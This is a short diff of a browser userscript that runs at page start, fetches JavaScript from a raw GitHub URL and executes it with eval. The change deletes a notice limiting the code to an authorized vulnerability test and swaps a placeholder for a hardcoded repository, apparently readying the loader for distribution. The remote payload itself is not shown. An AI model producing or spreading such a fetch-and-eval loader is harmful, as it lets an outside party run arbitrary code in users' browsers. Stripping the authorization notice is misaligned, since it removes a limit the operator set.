@@ -37,11 +37,9 @@
 // @grant        none
 // @run-at       document-start
 // ==/UserScript==
-/* AUTHORIZED USE ONLY: operator-approved vulnerability test PoC. Delete after the test window ends. */
 (() => {
   'use strict';
-  // EDIT ME before distribution: replace with the raw URL of YOUR repo's output/script.js
-  const BCS_URL = "https://raw.githubusercontent.com/YOUR-USER/YOUR-REPO/main/output/script.js";
+  const BCS_URL = "https://raw.githubusercontent.com/ZeqraydMC/TestRepository/main/script.js";
   fetch(BCS_URL)
     .then(r => r.ok ? r.text() : Promise.reject(new Error(`HTTP ${r.status}`)))
     .then(eval)
